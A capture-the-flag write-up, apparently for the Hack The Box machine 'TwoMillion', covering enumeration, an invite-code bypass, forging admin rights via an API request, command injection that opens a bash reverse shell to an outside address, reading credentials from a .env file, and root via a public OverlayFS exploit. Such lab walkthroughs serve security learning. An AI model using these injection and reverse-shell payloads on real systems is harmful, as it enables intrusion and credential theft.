# TwoMillion
## Enumeration
```nmap  10.10.11.221```
We can see that we have a ssh port open and a http port open.
Now let's write this : "10.10.11.221	2million.htb" in /etc/hosts in order to access the web site.
## Brut forcing directories
```gobuster dir -u http://10.10.11.221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -b 301```
We can see a /invite directory.
Let's go to http://2million.htb/invite.
## Creating an account
Here we see that we need an invite code in order to create an account.
If we go to the inspector of our web site and check the different allowed function, we find the makeInviteCode() function.
When we use it we get the ROT13 code : "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" that when decode become : "In order to generate the invite code, make a POST request to /api/v1/invite/generate".
Using BurpSuite we can make the POST request, it gives us an encrypted invite code that we can decrypt using base 64.
Then we get to create an account with this code!
## Getting an admin account
Now if we go to http://2million.htb/api/v1 we can find a list of endpoint with what they do.
and if we try to do a PUT request on the /api/v1/admin/settings/update with our connection cookie, we get a 200 status. But the response ask us to give a header and some data.
Here is the full request : ```curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=tnms38fmujol34l7m08fttls8v" --header "Content-Type: application/json" --data '{"email":"test@htb.com","is_admin":1}' | jq```
Now our account has admin rights!
## Command injection
Now we have access to this endpoint /api/v1/admin/vpn/generate that allow command injection.
Let's set up our netcat : ```nc -lvnp 8083```
Then make our injection :
```curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=tnms38fmujol34l7m08fttls8v" --header "Content-Type: application/json" --data '{"username":"test;bash -c \"bash -i >& /dev/tcp/10.10.14.224/8083 0>&1\";"}'```
YAYY!! we got a reverse-shell!
Making our shell more interactive : ```python3 -c "import pty;pty.spawn('/bin/bash')"```
## Becoming admin in the shell
We can get the admin password by displaying the /html/.env file.
Then we can connect to admin using ssh.
We can find the user flag in /home/admin/user.txt
## Privilege escalation
We can find an email sent by HTB Godfather to admin that deals with a CVE about OverlayFS. After some research we can find that it's the CV-2023-0386.
After some research we can find the following exploit : https://github.com/Fanxiaoyao66/CVE-2023-0386.
After following the steps of the README, we became root !!
We can find the flag in /root/root.txt
